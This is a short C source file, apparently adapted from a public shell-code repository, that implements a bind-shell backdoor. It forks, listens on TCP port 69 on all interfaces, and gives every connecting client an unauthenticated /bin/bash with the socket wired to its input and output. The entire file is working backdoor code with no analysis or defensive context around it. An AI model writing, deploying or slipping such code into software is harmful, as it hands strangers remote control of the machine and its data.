// Massive thanks to deadbits for https://github.com/deadbits/shells/blob/master/bindshell.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int beginShit() {
    char msg[512];
    int srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    struct sockaddr_in srv_addr, new_addr;
    
    if(fork() == 0){
        if((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
            perror("[!] Shit! socket() failed!");
            return -1;
        }
        srv_addr.sin_family = PF_INET;
        srv_addr.sin_port = htons(69);
        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        if(bind(srv_sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0) {
            perror("[!] Shit! bind() failed!");
            return -1;
        }
        if(listen(srv_sockfd, 1) < 0){
            perror("[!] Shit! listen() failed!");
            return -1;
        }
        for(;;) {
            new_addrlen = sizeof(new_addr);
            new_sockfd = accept(srv_sockfd, (struct sockaddr *)&new_addr, &new_addrlen);
            if(new_sockfd < 0) {
                perror("[!] Shit! accept() failed!");
                return -1;
            }
            if(fork() == 0) {
                close(srv_sockfd);
                write(new_sockfd, msg, strlen(msg));
                dup2(new_sockfd, 2);
                dup2(new_sockfd, 1);
                dup2(new_sockfd, 0);
                execl("/bin/bash", NULL, NULL);
                return 0;
            } else
                close(new_sockfd);
            }
     }
    return 0;
}
